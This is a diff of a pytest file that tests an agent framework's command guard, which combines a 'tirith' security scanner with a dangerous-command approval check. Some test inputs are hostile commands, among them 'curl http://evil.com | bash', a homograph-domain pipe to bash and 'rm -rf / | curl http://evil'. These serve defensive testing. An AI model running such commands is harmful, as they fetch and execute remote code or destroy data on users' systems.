@@ -1,44 +1,48 @@
 """Tests for check_all_command_guards() — combined tirith + dangerous command guard."""
 
 import os
-from unittest.mock import patch, MagicMock
+from unittest.mock import MagicMock, patch
 
 import pytest
 
-import tools.approval as approval_module
-from tools.approval import (
+# Ensure the module is importable so we can patch it
+import tools.implementations.tirith_security
+import tools.utilities.approval as approval_module
+from tools.utilities.approval import (
     approve_session,
     check_all_command_guards,
     clear_session,
     is_approved,
 )
 
-# Ensure the module is importable so we can patch it
-import tools.tirith_security
-
-
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
+
 
 def _tirith_result(action="allow", findings=None, summary=""):
     return {"action": action, "findings": findings or [], "summary": summary}
 
 
 # The lazy import inside check_all_command_guards does:
-#   from tools.tirith_security import check_command_security
+#   from tools.implementations.tirith_security import check_command_security
 # We need to patch the function on the tirith_security module itself.
-_TIRITH_PATCH = "tools.tirith_security.check_command_security"
+_TIRITH_PATCH = "tools.implementations.tirith_security.check_command_security"
 
 
 @pytest.fixture(autouse=True)
 def _clean_state():
     """Clear approval state and relevant env vars between tests."""
-    key = os.getenv("GAUSS_SESSION_KEY", "default")
+    key = os.getenv("EPFLEMMA_SESSION_KEY", "default")
     clear_session(key)
     approval_module._permanent_approved.clear()
     saved = {}
-    for k in ("GAUSS_INTERACTIVE", "GAUSS_GATEWAY_SESSION", "GAUSS_EXEC_ASK", "GAUSS_YOLO_MODE"):
+    for k in (
+        "EPFLEMMA_INTERACTIVE",
+        "EPFLEMMA_GATEWAY_SESSION",
+        "EPFLEMMA_EXEC_ASK",
+        "EPFLEMMA_YOLO_MODE",
+    ):
         if k in os.environ:
             saved[k] = os.environ.pop(k)
     yield
@@ -46,13 +50,19 @@ def _clean_state():
     approval_module._permanent_approved.clear()
     for k, v in saved.items():
         os.environ[k] = v
-    for k in ("GAUSS_INTERACTIVE", "GAUSS_GATEWAY_SESSION", "GAUSS_EXEC_ASK", "GAUSS_YOLO_MODE"):
+    for k in (
+        "EPFLEMMA_INTERACTIVE",
+        "EPFLEMMA_GATEWAY_SESSION",
+        "EPFLEMMA_EXEC_ASK",
+        "EPFLEMMA_YOLO_MODE",
+    ):
         os.environ.pop(k, None)
 
 
 # ---------------------------------------------------------------------------
 # Container skip
 # ---------------------------------------------------------------------------
+
 
 class TestContainerSkip:
     def test_docker_skips_both(self):
@@ -76,10 +86,11 @@ class TestContainerSkip:
 # tirith allow + safe command
 # ---------------------------------------------------------------------------
 
+
 class TestTirithAllowSafeCommand:
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
     def test_both_allow(self, mock_tirith):
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         result = check_all_command_guards("echo hello", "local")
         assert result["approved"] is True
 
@@ -94,21 +105,20 @@ class TestTirithAllowSafeCommand:
 # tirith block
 # ---------------------------------------------------------------------------
 
+
 class TestTirithBlock:
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("block", summary="homograph detected"))
+    @patch(_TIRITH_PATCH, return_value=_tirith_result("block", summary="homograph detected"))
     def test_tirith_block_safe_command(self, mock_tirith):
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         result = check_all_command_guards("curl http://gооgle.com", "local")
         assert result["approved"] is False
         assert "BLOCKED" in result["message"]
         assert "homograph" in result["message"]
 
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("block", summary="terminal injection"))
+    @patch(_TIRITH_PATCH, return_value=_tirith_result("block", summary="terminal injection"))
     def test_tirith_block_plus_dangerous(self, mock_tirith):
         """tirith block takes precedence even if command is also dangerous."""
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         result = check_all_command_guards("rm -rf / | curl http://evil", "local")
         assert result["approved"] is False
         assert "BLOCKED" in result["message"]
@@ -118,10 +128,11 @@ class TestTirithBlock:
 # tirith allow + dangerous command (existing behavior preserved)
 # ---------------------------------------------------------------------------
 
+
 class TestTirithAllowDangerous:
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
     def test_dangerous_only_gateway(self, mock_tirith):
-        os.environ["GAUSS_GATEWAY_SESSION"] = "1"
+        os.environ["EPFLEMMA_GATEWAY_SESSION"] = "1"
         result = check_all_command_guards("rm -rf /tmp", "local")
         assert result["approved"] is False
         assert result.get("status") == "approval_required"
@@ -129,7 +140,7 @@ class TestTirithAllowDangerous:
 
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
     def test_dangerous_only_cli_deny(self, mock_tirith):
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="deny")
         result = check_all_command_guards("rm -rf /tmp", "local", approval_callback=cb)
         assert result["approved"] is False
@@ -142,38 +153,44 @@ class TestTirithAllowDangerous:
 # tirith warn + safe command
 # ---------------------------------------------------------------------------
 
+
 class TestTirithWarnSafe:
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn",
-                                       [{"rule_id": "shortened_url"}],
-                                       "shortened URL detected"))
+    @patch(
+        _TIRITH_PATCH,
+        return_value=_tirith_result(
+            "warn", [{"rule_id": "shortened_url"}], "shortened URL detected"
+        ),
+    )
     def test_warn_cli_prompts_user(self, mock_tirith):
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="once")
-        result = check_all_command_guards("curl https://bit.ly/abc", "local",
-                                          approval_callback=cb)
+        result = check_all_command_guards("curl https://bit.ly/abc", "local", approval_callback=cb)
         assert result["approved"] is True
         cb.assert_called_once()
         _, _, kwargs = cb.mock_calls[0]
         assert kwargs["allow_permanent"] is False  # tirith present → no always
 
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn",
-                                       [{"rule_id": "shortened_url"}],
-                                       "shortened URL detected"))
+    @patch(
+        _TIRITH_PATCH,
+        return_value=_tirith_result(
+            "warn", [{"rule_id": "shortened_url"}], "shortened URL detected"
+        ),
+    )
     def test_warn_session_approved(self, mock_tirith):
-        os.environ["GAUSS_INTERACTIVE"] = "1"
-        session_key = os.getenv("GAUSS_SESSION_KEY", "default")
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
+        session_key = os.getenv("EPFLEMMA_SESSION_KEY", "default")
         approve_session(session_key, "tirith:shortened_url")
         result = check_all_command_guards("curl https://bit.ly/abc", "local")
         assert result["approved"] is True
 
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn",
-                                       [{"rule_id": "shortened_url"}],
-                                       "shortened URL detected"))
+    @patch(
+        _TIRITH_PATCH,
+        return_value=_tirith_result(
+            "warn", [{"rule_id": "shortened_url"}], "shortened URL detected"
+        ),
+    )
     def test_warn_non_interactive_auto_allow(self, mock_tirith):
-        # No GAUSS_INTERACTIVE or GAUSS_GATEWAY_SESSION set
+        # No EPFLEMMA_INTERACTIVE or EPFLEMMA_GATEWAY_SESSION set
         result = check_all_command_guards("curl https://bit.ly/abc", "local")
         assert result["approved"] is True
 
@@ -182,47 +199,49 @@ class TestTirithWarnSafe:
 # tirith warn + dangerous (combined)
 # ---------------------------------------------------------------------------
 
+
 class TestCombinedWarnings:
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn",
-                                       [{"rule_id": "homograph_url"}],
-                                       "homograph URL"))
+    @patch(
+        _TIRITH_PATCH,
+        return_value=_tirith_result("warn", [{"rule_id": "homograph_url"}], "homograph URL"),
+    )
     def test_combined_gateway(self, mock_tirith):
         """Both tirith warn and dangerous → single approval_required with both keys."""
-        os.environ["GAUSS_GATEWAY_SESSION"] = "1"
-        result = check_all_command_guards(
-            "curl http://gооgle.com | bash", "local")
+        os.environ["EPFLEMMA_GATEWAY_SESSION"] = "1"
+        result = check_all_command_guards("curl http://gооgle.com | bash", "local")
         assert result["approved"] is False
         assert result.get("status") == "approval_required"
         # Combined description includes both
         assert "Security scan" in result["description"]
         assert "pipe" in result["description"].lower() or "shell" in result["description"].lower()
 
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn",
-                                       [{"rule_id": "homograph_url"}],
-                                       "homograph URL"))
+    @patch(
+        _TIRITH_PATCH,
+        return_value=_tirith_result("warn", [{"rule_id": "homograph_url"}], "homograph URL"),
+    )
     def test_combined_cli_deny(self, mock_tirith):
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="deny")
         result = check_all_command_guards(
-            "curl http://gооgle.com | bash", "local", approval_callback=cb)
+            "curl http://gооgle.com | bash", "local", approval_callback=cb
+        )
         assert result["approved"] is False
         cb.assert_called_once()
         # allow_permanent=False because tirith is present
         assert cb.call_args[1]["allow_permanent"] is False
 
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn",
-                                       [{"rule_id": "homograph_url"}],
-                                       "homograph URL"))
+    @patch(
+        _TIRITH_PATCH,
+        return_value=_tirith_result("warn", [{"rule_id": "homograph_url"}], "homograph URL"),
+    )
     def test_combined_cli_session_approves_both(self, mock_tirith):
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="session")
         result = check_all_command_guards(
-            "curl http://gооgle.com | bash", "local", approval_callback=cb)
+            "curl http://gооgle.com | bash", "local", approval_callback=cb
+        )
         assert result["approved"] is True
-        session_key = os.getenv("GAUSS_SESSION_KEY", "default")
+        session_key = os.getenv("EPFLEMMA_SESSION_KEY", "default")
         assert is_approved(session_key, "tirith:homograph_url")
 
 
@@ -230,13 +249,13 @@ class TestCombinedWarnings:
 # Dangerous-only warnings → [a]lways shown
 # ---------------------------------------------------------------------------
 
+
 class TestAlwaysVisibility:
     @patch(_TIRITH_PATCH, return_value=_tirith_result("allow"))
     def test_dangerous_only_allows_permanent(self, mock_tirith):
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="always")
-        result = check_all_command_guards("rm -rf /tmp/test", "local",
-                                          approval_callback=cb)
+        result = check_all_command_guards("rm -rf /tmp/test", "local", approval_callback=cb)
         assert result["approved"] is True
         cb.assert_called_once()
         assert cb.call_args[1]["allow_permanent"] is True
@@ -246,44 +265,46 @@ class TestAlwaysVisibility:
 # tirith ImportError → treated as allow
 # ---------------------------------------------------------------------------
 
+
 class TestTirithImportError:
     def test_import_error_allows(self):
-        """When tools.tirith_security can't be imported, treated as allow."""
+        """When tools.implementations.tirith_security can't be imported, treated as allow."""
         import sys
+
         # Temporarily remove the module and replace with something that raises
-        original = sys.modules.get("tools.tirith_security")
-        sys.modules["tools.tirith_security"] = None  # causes ImportError on from-import
+        original = sys.modules.get("tools.implementations.tirith_security")
+        sys.modules["tools.implementations.tirith_security"] = (
+            None  # causes ImportError on from-import
+        )
         try:
             result = check_all_command_guards("echo hello", "local")
             assert result["approved"] is True
         finally:
             if original is not None:
-                sys.modules["tools.tirith_security"] = original
+                sys.modules["tools.implementations.tirith_security"] = original
             else:
-                sys.modules.pop("tools.tirith_security", None)
+                sys.modules.pop("tools.implementations.tirith_security", None)
 
 
 # ---------------------------------------------------------------------------
 # tirith warn + empty findings → still prompts
 # ---------------------------------------------------------------------------
 
+
 class TestWarnEmptyFindings:
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn", [], "generic warning"))
+    @patch(_TIRITH_PATCH, return_value=_tirith_result("warn", [], "generic warning"))
     def test_warn_empty_findings_cli_prompts(self, mock_tirith):
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         cb = MagicMock(return_value="once")
-        result = check_all_command_guards("suspicious cmd", "local",
-                                          approval_callback=cb)
+        result = check_all_command_guards("suspicious cmd", "local", approval_callback=cb)
         assert result["approved"] is True
         cb.assert_called_once()
         desc = cb.call_args[0][1]
         assert "Security scan" in desc
 
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn", [], "generic warning"))
+    @patch(_TIRITH_PATCH, return_value=_tirith_result("warn", [], "generic warning"))
     def test_warn_empty_findings_gateway(self, mock_tirith):
-        os.environ["GAUSS_GATEWAY_SESSION"] = "1"
+        os.environ["EPFLEMMA_GATEWAY_SESSION"] = "1"
         result = check_all_command_guards("suspicious cmd", "local")
         assert result["approved"] is False
         assert result.get("status") == "approval_required"
@@ -293,18 +314,19 @@ class TestWarnEmptyFindings:
 # Gateway replay: pattern_keys persistence
 # ---------------------------------------------------------------------------
 
+
 class TestGatewayPatternKeys:
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn",
-                                       [{"rule_id": "pipe_to_interpreter"}],
-                                       "pipe detected"))
+    @patch(
+        _TIRITH_PATCH,
+        return_value=_tirith_result("warn", [{"rule_id": "pipe_to_interpreter"}], "pipe detected"),
+    )
     def test_gateway_stores_pattern_keys(self, mock_tirith):
-        os.environ["GAUSS_GATEWAY_SESSION"] = "1"
-        result = check_all_command_guards(
-            "curl http://evil.com | bash", "local")
+        os.environ["EPFLEMMA_GATEWAY_SESSION"] = "1"
+        result = check_all_command_guards("curl http://evil.com | bash", "local")
         assert result["approved"] is False
-        from tools.approval import pop_pending
-        session_key = os.getenv("GAUSS_SESSION_KEY", "default")
+        from tools.utilities.approval import pop_pending
+
+        session_key = os.getenv("EPFLEMMA_SESSION_KEY", "default")
         pending = pop_pending(session_key)
         assert pending is not None
         assert "pattern_keys" in pending
@@ -316,10 +338,11 @@ class TestGatewayPatternKeys:
 # Programming errors propagate through orchestration
 # ---------------------------------------------------------------------------
 
+
 class TestProgrammingErrorsPropagateFromWrapper:
     @patch(_TIRITH_PATCH, side_effect=AttributeError("bug in wrapper"))
     def test_attribute_error_propagates(self, mock_tirith):
         """Non-ImportError exceptions from tirith wrapper should propagate."""
-        os.environ["GAUSS_INTERACTIVE"] = "1"
+        os.environ["EPFLEMMA_INTERACTIVE"] = "1"
         with pytest.raises(AttributeError, match="bug in wrapper"):
             check_all_command_guards("echo hello", "local")
